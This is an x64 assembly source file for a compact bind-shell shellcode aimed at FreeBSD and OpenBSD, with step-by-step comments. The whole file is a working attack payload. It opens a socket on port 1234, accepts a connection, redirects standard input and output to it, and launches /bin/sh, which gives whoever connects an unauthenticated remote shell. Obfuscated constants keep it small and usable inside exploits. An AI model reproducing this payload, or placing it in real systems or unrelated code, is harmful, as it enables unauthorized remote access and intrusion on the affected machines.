

; 76 byte bind shell
; x64 versions of freebsd + openbsd
; odzhan

    bits 64
    
start64:
    ; step 1, create a socket
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    push    97
    pop     rax              ; rax=sys_socket
    cdq                      ; rdx=IPPROTO_IP
    push    1
    pop     rsi              ; rsi=SOCK_STREAM
    push    2
    pop     rdi              ; rdi=AF_INET        
    syscall
    
    xchg    eax, edi         ; edi=sockfd
    
    ; step 2, bind to port 1234 
    ; bind(sockfd, {AF_INET,1234,INADDR_ANY}, 16)
    mov     ebx, ~0xd2040200 & 0xFFFFFFFF
    not     ebx
    push    rbx
    push    rsp
    pop     rsi
    mov     dl, 16
    mov     al, 104
    syscall
    
    ; step 3, listen
    ; listen(sockfd, 0);
    push    rax
    pop     rsi
    mov     al, 106
    syscall
    
    ; step 4, accept connections
    ; accept(sockfd, 0, 0);
    mov     al, 30
    cdq
    syscall
    
    xchg    eax, edi         ; edi=sockfd
    push    2
    pop     rsi
    
    ; step 5, assign socket handle to stdin,stdout,stderr
    ; dup2(sockfd, fileno);
dup_loop64:
    push    90
    pop     rax              ; rax=sys_dup2
    syscall
    dec     esi
    jns     dup_loop64       ; jump if not signed   
    
    ; step 6, execute /bin/sh
    ; execve("/bin//sh", {"/bin//sh", NULL}, 0);
    cdq                      ; rdx=0
    mov     rbx, 0x68732f2f6e69622f ; "/bin//sh"
    push    rdx              ; 0
    push    rbx              ; "/bin//sh"
    push    rsp
    pop     rdi              ; "/bin//sh", 0
    ; ---------
    push    rdx              ; argv[1]=NULL
    push    rdi              ; argv[0]="/bin//sh", 0
    push    rsp
    pop     rsi              ; rsi=argv
    ; ---------
    mov     al, 59           ; rax=sys_execve
    syscall
